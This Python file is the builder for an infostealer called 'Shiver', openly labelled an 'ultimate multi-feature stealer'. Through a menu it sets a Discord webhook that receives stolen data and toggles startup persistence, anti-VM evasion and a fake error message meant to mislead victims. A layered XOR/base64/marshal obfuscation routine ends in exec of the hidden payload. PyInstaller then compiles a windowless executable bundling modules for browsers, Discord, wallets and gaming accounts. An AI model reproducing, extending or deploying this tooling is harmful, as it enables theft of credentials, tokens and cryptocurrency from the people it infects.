import os
import sys
import json
import shutil
import subprocess
import base64
import random
import string
import tempfile

if os.name == 'nt':
    os.system('')

CONFIG_FILE = 'shiver_config.json'

COLORS = {
    'reset': '\033[0m',
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'bold': '\033[1m',
    'dim': '\033[2m',
}

def colorize(text, color):
    return COLORS.get(color, '') + text + COLORS['reset']

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {
        'webhook': '',
        'obfuscation': False,
        'startup': False,
        'anti_vm': True,
        'fake_error': {
            'enabled': False,
            'title': 'Critical System Error',
            'message': 'An unexpected error occurred. Please restart your computer.',
            'icon': 'error'
        },
        'output_name': 'Shiver',
        'custom_icon': '',
    }

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def check_dependencies():
    missing = []
    try:
        import requests
    except:
        missing.append('requests')
    try:
        from Crypto.Cipher import AES
    except:
        missing.append('pycryptodome')
    try:
        import psutil
    except:
        missing.append('psutil')
    try:
        from PIL import ImageGrab
    except:
        missing.append('Pillow')
    if missing:
        print(colorize('[!] Missing dependencies: ', 'red') + colorize(', '.join(missing), 'yellow'))
        print(colorize('[*] Installing...', 'cyan'))
        for dep in missing:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])
        print(colorize('[+] Dependencies installed!', 'green'))
    else:
        print(colorize('[+] All dependencies satisfied.', 'green'))

def _x(a):
    import marshal, zlib
    b = compile(a, '<string>', 'exec')
    c = marshal.dumps(b)
    d = zlib.compress(c)
    return base64.b64encode(d).decode()

def obfuscate_code(code):
    try:
        s1 = _x(code)
        s1b = s1.encode('latin-1')
        x1 = bytearray(len(s1b))
        for i in range(len(s1b)):
            x1[i] = s1b[i] ^ ((i * 7 + 3) & 0xFF)
        s2 = base64.b64encode(bytes(x1)).decode()
        s3 = s2[::-1]
        s3b = s3.encode('latin-1')
        x2 = bytearray(len(s3b))
        for i in range(len(s3b)):
            x2[i] = s3b[i] ^ ((i * 11 + 5) & 0xFF)
        s4 = base64.b64encode(bytes(x2)).decode()
        rk = bytes([random.randint(1, 255) for _ in range(48)])
        s4b = s4.encode('latin-1')
        s5 = bytes(a ^ b for a, b in zip(s4b, rk * (len(s4b) // 48 + 1)))[:len(s4b)]
        s6 = base64.b64encode(s5).decode()
        ek = base64.b64encode(bytes(~x & 0xFF for x in rk)).decode()
        loader = (
            'import base64\n'
            '_a=' + repr(s6) + '\n'
            '_b=' + repr(ek) + '\n'
            '_c=base64.b64decode\n'
            '_d=bytes(~x&255 for x in _c(_b))\n'
            '_e=_c(_a)\n'
            '_f=bytes(a^b for a,b in zip(_e,_d*(len(_e)//48+1)))[:len(_e)]\n'
            '_g=_c(_f).decode("latin-1")\n'
            '_h=bytearray(len(_g))\n'
            'for _i in range(len(_g)):\n'
            ' _h[_i]=ord(_g[_i])^((_i*11+5)&255)\n'
            '_j=_h.decode("latin-1")\n'
            '_k=_j[::-1]\n'
            '_l=_c(_k)\n'
            '_m=bytearray(len(_l))\n'
            'for _n in range(len(_l)):\n'
            ' _m[_n]=_l[_n]^((_n*7+3)&255)\n'
            '_o=_m.decode("latin-1")\n'
            'import marshal,zlib\n'
            'exec(marshal.loads(zlib.decompress(_c(_o))))\n'
        )
        return loader
    except Exception as e:
        print(colorize('[!] ', 'red') + str(e))
    return code

BANNER_LINES = [
    '',
    '  SSSSS  H   H  IIIII  V   V  EEEEE  RRRR  ',
    '  S      H   H    I    V   V  E      R   R ',
    '  SSS    HHHHH    I    V   V  EEE    RRRR  ',
    '     S   H   H    I     V V   E      R  R  ',
    '  SSSS   H   H  IIIII    V    EEEEE  R   R ',
    '',
    '       ULTIMATE MULTI-FEATURE STEALER      ',
    '',
]

def make_banner():
    bx = 58
    lines = []
    lines.append('+' + '-' * bx + '+')
    for l in BANNER_LINES:
        if len(l) > bx:
            l = l[:bx]
        p = bx - len(l)
        lp = p // 2
        rp = p - lp
        lines.append('|' + ' ' * lp + l + ' ' * rp + '|')
    lines.append('+' + '-' * bx + '+')
    return '\n'.join(lines)

class Builder:
    def __init__(self):
        self.config = load_config()

    def show_menu(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
            self.print_config_status()
            print()
            print(colorize('    ==================================================', 'cyan'))
            print(colorize('              SHIVER BUILDER MENU', 'bold'))
            print(colorize('    ==================================================', 'cyan'))
            print()
            print(colorize('    [1]', 'yellow') + colorize(' Set Webhook URL', 'white'))
            print(colorize('    [2]', 'yellow') + colorize(' Toggle Obfuscation', 'white'))
            print(colorize('    [3]', 'yellow') + colorize(' Toggle Startup', 'white'))
            print(colorize('    [4]', 'yellow') + colorize(' Toggle Anti-VM Check', 'white'))
            print(colorize('    [5]', 'yellow') + colorize(' Configure Fake Error', 'white'))
            print(colorize('    [6]', 'yellow') + colorize(' Set Output Name', 'white'))
            print(colorize('    [7]', 'yellow') + colorize(' Check Dependencies', 'white'))
            print(colorize('    [8]', 'green') + colorize(' BUILD STUB', 'bold'))
            print(colorize('    [9]', 'red') + colorize(' Exit', 'white'))
            print()
            choice = input(colorize('    [?] Select option: ', 'cyan')).strip()
            if choice == '1':
                self.set_webhook()
            elif choice == '2':
                self.config['obfuscation'] = not self.config['obfuscation']
                save_config(self.config)
                status = colorize('ENABLED', 'green') if self.config['obfuscation'] else colorize('DISABLED', 'red')
                print('\n    ' + colorize('[+]', 'green') + colorize(' Obfuscation: ', 'white') + status)
                input(colorize('    Press Enter to continue...', 'dim'))
            elif choice == '3':
                self.config['startup'] = not self.config['startup']
                save_config(self.config)
                status = colorize('ENABLED', 'green') if self.config['startup'] else colorize('DISABLED', 'red')
                print('\n    ' + colorize('[+]', 'green') + colorize(' Startup: ', 'white') + status)
                input(colorize('    Press Enter to continue...', 'dim'))
            elif choice == '4':
                self.config['anti_vm'] = not self.config['anti_vm']
                save_config(self.config)
                status = colorize('ENABLED', 'green') if self.config['anti_vm'] else colorize('DISABLED', 'red')
                print('\n    ' + colorize('[+]', 'green') + colorize(' Anti-VM: ', 'white') + status)
                input(colorize('    Press Enter to continue...', 'dim'))
            elif choice == '5':
                self.configure_fake_error()
            elif choice == '6':
                self.set_output_name()
            elif choice == '7':
                check_dependencies()
                input(colorize('\n    Press Enter to continue...', 'dim'))
            elif choice == '8':
                self.build_stub()
            elif choice == '9':
                print(colorize('\n    [+] Exiting...', 'yellow'))
                break
            else:
                print(colorize('\n    [!] Invalid option!', 'red'))
                input(colorize('    Press Enter to continue...', 'dim'))

    def print_banner(self):
        b = make_banner()
        for line in b.split('\n'):
            print(colorize('    ', 'cyan') + colorize(line, 'cyan'))

    def print_config_status(self):
        print(colorize('    --------------------------------------------------', 'blue'))
        print(colorize('    CONFIGURATION', 'bold'))
        print(colorize('    --------------------------------------------------', 'blue'))
        webhook_status = colorize('SET', 'green') if self.config['webhook'] else colorize('NOT SET', 'red')
        print(colorize('    Webhook    : ', 'white') + webhook_status)
        obf_status = colorize('ENABLED', 'green') if self.config['obfuscation'] else colorize('DISABLED', 'red')
        print(colorize('    Obfuscation: ', 'white') + obf_status)
        startup_status = colorize('ENABLED', 'green') if self.config['startup'] else colorize('DISABLED', 'red')
        print(colorize('    Startup    : ', 'white') + startup_status)
        antivm_status = colorize('ENABLED', 'green') if self.config['anti_vm'] else colorize('DISABLED', 'red')
        print(colorize('    Anti-VM    : ', 'white') + antivm_status)
        fake_status = colorize('ENABLED', 'green') if self.config['fake_error']['enabled'] else colorize('DISABLED', 'red')
        print(colorize('    Fake Error : ', 'white') + fake_status)
        output_name = self.config['output_name'] + '.exe'
        print(colorize('    Output     : ', 'white') + colorize(output_name, 'yellow'))
        print(colorize('    --------------------------------------------------', 'blue'))

    def set_webhook(self):
        print(colorize('\n    --------------------------------------------------', 'blue'))
        print(colorize('    SET WEBHOOK', 'bold'))
        print(colorize('    --------------------------------------------------', 'blue'))
        url = input(colorize('    Discord Webhook URL: ', 'cyan')).strip()
        if url.startswith('http') and 'discord' in url:
            self.config['webhook'] = url
            save_config(self.config)
            print(colorize('    [+] Webhook saved!', 'green'))
        else:
            print(colorize('    [!] Invalid webhook URL!', 'red'))
        input(colorize('    Press Enter to continue...', 'dim'))

    def configure_fake_error(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
            print()
            print(colorize('    --------------------------------------------------', 'blue'))
            print(colorize('    FAKE ERROR CONFIGURATION', 'bold'))
            print(colorize('    --------------------------------------------------', 'blue'))
            print()
            status = colorize('ENABLED', 'green') if self.config['fake_error']['enabled'] else colorize('DISABLED', 'red')
            fe = self.config['fake_error']
            print(colorize('    Status: ', 'white') + status)
            print(colorize('    Title : ', 'white') + colorize(fe['title'][:40], 'yellow'))
            print(colorize('    Icon  : ', 'white') + colorize(fe['icon'], 'yellow'))
            print(colorize('    Msg   : ', 'white') + colorize(fe['message'][:40], 'yellow'))
            print()
            print(colorize('    [1]', 'yellow') + colorize(' Toggle Enable/Disable', 'white'))
            print(colorize('    [2]', 'yellow') + colorize(' Set Title', 'white'))
            print(colorize('    [3]', 'yellow') + colorize(' Set Message', 'white'))
            print(colorize('    [4]', 'yellow') + colorize(' Set Icon Type (error/warning/info/question)', 'white'))
            print(colorize('    [5]', 'red') + colorize(' Back to Main Menu', 'white'))
            c = input(colorize('\n    [?] Option: ', 'cyan')).strip()
            if c == '1':
                self.config['fake_error']['enabled'] = not self.config['fake_error']['enabled']
                save_config(self.config)
            elif c == '2':
                title = input(colorize('    [?] Error Title: ', 'cyan')).strip()
                if title:
                    self.config['fake_error']['title'] = title
                    save_config(self.config)
            elif c == '3':
                msg = input(colorize('    [?] Error Message: ', 'cyan')).strip()
                if msg:
                    self.config['fake_error']['message'] = msg
                    save_config(self.config)
            elif c == '4':
                icon = input(colorize('    [?] Icon (error/warning/info/question): ', 'cyan')).strip().lower()
                if icon in ['error', 'warning', 'info', 'question']:
                    self.config['fake_error']['icon'] = icon
                    save_config(self.config)
            elif c == '5':
                break

    def set_output_name(self):
        name = input(colorize('\n    [?] Output file name (without .exe): ', 'cyan')).strip()
        if name:
            self.config['output_name'] = name
            save_config(self.config)
            print(colorize('    [+] Output name set to: ', 'green') + colorize(name, 'yellow'))
        input(colorize('    Press Enter to continue...', 'dim'))

    def build_stub(self):
        if not self.config['webhook']:
            print(colorize('\n    [!] Please set a webhook URL first!', 'red'))
            input(colorize('    Press Enter to continue...', 'dim'))
            return
        print(colorize('\n    [*] Generating stub...', 'cyan'))
        stub_code = self.generate_stub_code()
        if self.config['obfuscation']:
            print(colorize('    [*] Applying obfuscation...', 'cyan'))
            stub_code = obfuscate_code(stub_code)
        self.compile_to_exe(stub_code)

    def generate_stub_code(self):
        config_json = json.dumps(self.config).replace('true', 'True').replace('false', 'False').replace('null', 'None')
        core_code = self.get_core_code()
        core_repr = repr(core_code)
        code = (
            '# -*- coding: utf-8 -*-\n'
            'import sys,json,os,base64,subprocess,tempfile\n\n'
            'CONFIG = ' + config_json + '\n\n'
            'def main():\n'
            '    try:\n'
            '        from core.stealer import Stealer\n'
            '        s = Stealer(CONFIG["webhook"], CONFIG)\n'
            '        s.run()\n'
            '    except ImportError:\n'
            '        temp_dir = tempfile.mkdtemp()\n'
            '        shiver_code = ' + core_repr + '\n'
            '        for filepath, content in shiver_code.items():\n'
            '            full_path = os.path.join(temp_dir, filepath)\n'
            '            os.makedirs(os.path.dirname(full_path), exist_ok=True)\n'
            '            with open(full_path, "w", encoding="utf-8") as f:\n'
            '                f.write(content)\n'
            '        sys.path.insert(0, temp_dir)\n'
            '        from core.stealer import Stealer\n'
            '        s = Stealer(CONFIG["webhook"], CONFIG)\n'
            '        s.run()\n\n'
            'if __name__ == "__main__":\n'
            '    main()\n'
        )
        return code

    def get_core_code(self):
        core_files = {}
        core_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core')
        for root, dirs, files in os.walk(core_dir):
            for file in files:
                if file.endswith('.py'):
                    filepath = os.path.join(root, file)
                    rel_path = os.path.relpath(filepath, os.path.dirname(core_dir))
                    with open(filepath, 'r', encoding='utf-8') as f:
                        core_files[rel_path] = f.read()
        return core_files

    def compile_to_exe(self, stub_code):
        try:
            build_dir = os.path.join(os.getcwd(), 'shiver_build_temp')
            if os.path.exists(build_dir):
                shutil.rmtree(build_dir, ignore_errors=True)
            os.makedirs(build_dir)

            stub_path = os.path.join(build_dir, 'shiver_stub.py')
            with open(stub_path, 'w', encoding='utf-8') as f:
                f.write(stub_code)

            core_src = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core')
            core_dst = os.path.join(build_dir, 'core')
            if os.path.exists(core_dst):
                shutil.rmtree(core_dst)
            shutil.copytree(core_src, core_dst)

            print(colorize('    [*] Compiling with PyInstaller...', 'cyan'))
            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile', '--noconsole',
                '--name', self.config['output_name'],
                '--distpath', os.getcwd(),
                '--workpath', os.path.join(build_dir, 'pyi_build'),
                '--specpath', build_dir,
                '--collect-submodules', 'core',
                '--collect-submodules', 'Crypto',
                '--collect-submodules', 'PIL',
                '--copy-metadata', 'psutil',
                '--add-data', core_dst + os.pathsep + 'core',
                '--hidden-import', 'requests',
                '--hidden-import', 'Crypto',
                '--hidden-import', 'Crypto.Cipher',
                '--hidden-import', 'Crypto.Cipher.AES',
                '--hidden-import', 'psutil',
                '--hidden-import', 'PIL',
                '--hidden-import', 'PIL.ImageGrab',
                '--hidden-import', 'core.utils',
                '--hidden-import', 'core.browsers',
                '--hidden-import', 'core.discord',
                '--hidden-import', 'core.system',
                '--hidden-import', 'core.wallets',
                '--hidden-import', 'core.gaming',
                '--hidden-import', 'core.kiwi',
                '--hidden-import', 'core.webhook',
                '--hidden-import', 'core.stealer',
                stub_path
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            out_exe = os.path.join(os.getcwd(), self.config['output_name'] + '.exe')
            if os.path.exists(out_exe):
                size_kb = os.path.getsize(out_exe) / 1024
                print(colorize('\n    [+] SUCCESS! Stub built: ', 'green') + colorize(out_exe, 'yellow'))
                print(colorize('    [+] Size: ', 'green') + colorize('{:.1f} KB'.format(size_kb), 'yellow'))
            else:
                print(colorize('\n    [!] Build failed. Last output:', 'red'))
                print(result.stdout[-1500:] if result.stdout else '')
                if result.stderr:
                    print(result.stderr[-1500:] if result.stderr else '')

            shutil.rmtree(build_dir, ignore_errors=True)
            for extra in ['__pycache__', 'build', 'shiver_stub.spec']:
                p = os.path.join(os.getcwd(), extra)
                if os.path.exists(p):
                    try:
                        if os.path.isdir(p):
                            shutil.rmtree(p, ignore_errors=True)
                        else:
                            os.remove(p)
                    except:
                        pass
        except subprocess.TimeoutExpired:
            print(colorize('\n    [!] Build timed out (10 minutes)', 'red'))
        except Exception as e:
            print(colorize('\n    [!] Build error: ', 'red') + str(e))
        try:
            input(colorize('\n    Press Enter to continue...', 'dim'))
        except EOFError:
            pass

if __name__ == '__main__':
    b = Builder()
    if len(sys.argv) > 1:
        if sys.argv[1] == '--build-auto':
            b.config = load_config()
            if b.config['webhook']:
                b.build_stub()
            else:
                print(colorize('[!] No webhook configured.', 'red'))
        elif sys.argv[1] == '--install-deps':
            check_dependencies()
    else:
        b.show_menu()
